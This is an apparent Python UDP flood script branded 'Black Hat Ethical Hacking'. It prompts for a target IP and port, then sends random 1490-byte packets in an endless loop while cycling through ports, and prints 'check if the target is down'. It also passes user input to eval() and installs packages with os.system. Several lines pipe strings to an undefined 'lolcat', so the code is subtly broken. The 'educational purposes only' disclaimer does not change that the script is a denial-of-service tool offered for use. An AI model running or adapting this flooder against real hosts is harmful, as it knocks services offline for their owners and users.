import sys
import os
import time
import socket
import random
#This is where the magic starts using the power of python
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############
#Install Figlet
os.system("clear")
os.system("apt-get install -y figlet")
os.system("pip install lolcat")
os.system("figlet Black Hat Ethical Hacking" | lolcat)
print()
print("Author   : SaintDruG") | lolcat
print("Website : https://www.blackhatethicalhacking.com") | lolcat
print("Github   : https://github.com/blackhatethicalhacking") | lolcat
print("Facebook : https://www.facebook.com/secur1ty1samyth") | lolcat
print("YouTube : https://www.youtube.com/channel/UC7-AsunT7zO-ny5-U8glqkw") | lolcat
print("Linkedin : https://www.linkedin.com/company/black-hat-ethical-hacking/") | lolcat
print("Instagram : https://www.instagram.com/blackhatethicalhacking/") | lolcat
print("Twitter : https://twitter.com/secur1ty1samyth") | lolcat
print("Security is a myth..   : Follow us & Stay Tuned!") | lolcat
print("This tool is written for Educational purposes only - helping the defensive team look into how such attacks take place.") | lolcat
print("BHEH Is not responsible for misusing it and must have an NDA signed to perform such attacks") | lolcat
print()
ip = input("IP Target : ") | lolcat
port = eval(input("Port       : ")) | lolcat
os.system("clear") | lolcat
os.system("figlet Attack Starting") | lolcat
print("[                    ] 0% ") | lolcat
time.sleep(4.9)
print("[=====               ] 25%") | lolcat
time.sleep(4.9)
print("[==========          ] 50%") | lolcat
time.sleep(4.9)
print("[===============     ] 75%") | lolcat
time.sleep(4.9)
print("[====================] 100%") | lolcat
time.sleep(2.9)
sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent = sent + 1
    port = port + 1
    print("Sent %s packet to %s throught port:%s - Packets are being sent like crazy, check if the target is down..." %
          (sent, ip, port)) | lolcat
    if port == 65534:
       port = 1
